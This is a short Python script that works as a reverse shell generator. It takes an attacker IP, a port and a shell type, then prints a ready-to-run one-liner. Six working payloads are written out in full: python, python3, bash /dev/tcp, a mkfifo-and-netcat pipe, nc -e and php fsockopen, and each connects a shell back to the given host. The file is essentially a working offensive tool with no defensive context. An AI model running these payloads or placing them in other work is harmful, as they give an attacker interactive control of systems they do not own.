#!/usr/bin/python3
from argparse import ArgumentParser
import sys

if __name__ == '__main__':
    parser = ArgumentParser(description="Reverse shell generator\nBy:A$TRA", epilog="Example: %(prog)s -i 192.168.1.95 -p 4444 -t py")
    parser.add_argument('-i', '--ip', help='IP to get reverse connection on.')
    parser.add_argument('-p', '--port', default='4444', help='Reverse connection port.')
    parser.add_argument('-t', '--type', default='bash', help='type of reverse shell: py, py3, bash, bash2, nc, php')
    args = parser.parse_args()

    if(len(sys.argv)) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
    
    ip = args.ip
    port = args.port
    stype = args.type

    #reverse_shell_types
    py = f'''python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    '''
    py3 = f'''python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    '''
    bash = f"bash -c 'bash >& /dev/tcp/{ip}/{port} 0>&1'"
    bash2 = f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
    nc = f"nc -e /bin/sh {ip} {port}"
    php = f'''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' '''

    if stype == 'py':
        print(py)
    elif stype == 'py3':
        print(py3)
    elif stype == 'bash':
        print(bash)
    elif stype == 'bash2':
        print(bash2)
    elif stype == 'nc':
        print(nc)
    elif stype == 'php':
        print(php)
    else:
        print("Invalid shell type!\nAvailable types: py, py3, bash, bash2, nc, php")